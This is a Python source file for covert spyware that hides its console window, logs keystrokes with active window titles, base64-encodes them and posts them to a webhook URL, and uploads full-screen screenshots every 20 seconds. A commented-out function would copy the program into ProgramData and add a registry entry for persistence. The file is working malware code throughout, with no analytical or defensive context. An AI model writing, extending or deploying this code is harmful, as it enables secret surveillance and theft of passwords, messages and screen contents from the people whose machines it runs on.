from dotenv import load_dotenv
load_dotenv()
import time
import threading
import requests
import base64
import ctypes
import mss
import pygetwindow as gw
from pynput import keyboard
import os

WEBHOOK_URL = os.getenv("WEBHOOK_URL")
KEY_INTERVAL = 10
SS_INTERVAL = 20
MAX_KEYS = 20
esc_pressed = None
keystrokes = []
current_window = None
exit_flag = False
lock = threading.Lock()
last_key_time = time.time()
last_ss_time = time.time()


def hide_console():
    try:
        ctypes.windll.kernel32.FreeConsole()
    except Exception:
        pass


#
# def add_to_registry():
#     exe_dest = os.path.join("C:\\ProgramData", X_NAME)
#
#
#     if not os.path.exists(exe_dest):
#         exe_src = os.path.abspath(__file__)
#         shutil.copy(exe_src, exe_dest)
#
#     try:
#         key = winreg.HKEY_CURRENT_USER
#         with winreg.OpenKey(key, regPath, 0, winreg.KEY_READ) as reg_key:
#             try:
#                 # Check if registry key exists
#                 existing_value, _ = winreg.QueryValueEx(reg_key, REG_NAME)
#                 if existing_value == exe_dest:
#                     return
#             except FileNotFoundError:
#                 pass
#     except FileNotFoundError:
#         pass
#
#
#     try:
#         with winreg.CreateKey(winreg.HKEY_CURRENT_USER, regPath) as reg_key:
#             winreg.SetValueEx(reg_key, REG_NAME, 0, winreg.REG_SZ, exe_dest)
#     except Exception as e:
#         print(f"[ERROR] Registry Write Failed: {e}")


def capture_screenshot():
    with mss.mss() as sct:
        ssc = sct.grab(sct.monitors[1])
        img = mss.tools.to_png(ssc.rgb, ssc.size)
        try:
            files = {"file": ("screenshot.png", img, "image/png")}
            requests.post(WEBHOOK_URL, files=files)
        except requests.exceptions.RequestException:
            pass


def b_enc(data):
    return base64.b64encode(data.encode()).decode()


def get_active_window():
    try:
        window = gw.getActiveWindow()
        return window.title if window else "Unknown Window"
    except Exception:
        return "Unknown Window"


def listen(key):
    global keystrokes, current_window, exit_flag, last_key_time, esc_pressed
    last_key_time = time.time()
    keystroke = ""
    try:
        if key == keyboard.Key.enter:
            keystroke = "\n"
        elif key == keyboard.Key.tab:
            keystroke = "\t"
        elif key == keyboard.Key.space:
            keystroke = " "
        elif key in {keyboard.Key.shift, keyboard.Key.shift_r, keyboard.Key.ctrl, keyboard.Key.ctrl_r}:
            return
        elif key == keyboard.Key.backspace:
            with lock:
                if keystrokes:
                    keystrokes.pop()
            return
        elif key == keyboard.Key.esc:
            if esc_pressed is None:
                esc_pressed = time.time()
            elif time.time() - esc_pressed >= 5:
                print("\n[INFO] Exiting keylogger...")
                exit_flag = True
                return False
        elif isinstance(key, keyboard.KeyCode):
            keystroke = key.char
        elif hasattr(key, 'name'):
            keystroke = f"[{key.name.upper()}]"
    except AttributeError:
        return

    new_window = get_active_window()
    with lock:
        if new_window != current_window:
            current_window = new_window
            keystrokes.append(f"\n[{time.strftime('%Y-%m-%d %H:%M:%S')}] {current_window}\n")
        keystrokes.append(keystroke)
    if len(keystrokes) >= MAX_KEYS:
        threading.Thread(target=send_logs, daemon=True).start()


def send_logs():
    global keystrokes
    with lock:
        if not keystrokes:
            return
        payload = {"content": f"```{b_enc(''.join(keystrokes))}```"}
        keystrokes = []
        try:
            requests.post(WEBHOOK_URL, json=payload)
        except requests.exceptions.RequestException:
            pass


def auto_send():
    global last_key_time, last_ss_time
    while not exit_flag:
        time.sleep(1)
        current_time = time.time()
        if current_time - last_key_time >= KEY_INTERVAL:
            send_logs()
            last_key_time = current_time
        if current_time - last_ss_time >= SS_INTERVAL:
            capture_screenshot()
            last_ss_time = current_time


hide_console()
send_thread = threading.Thread(target=auto_send, daemon=True)
send_thread.start()
keystrokes_listener = keyboard.Listener(on_press=listen)
keystrokes_listener.start()
keystrokes_listener.join()



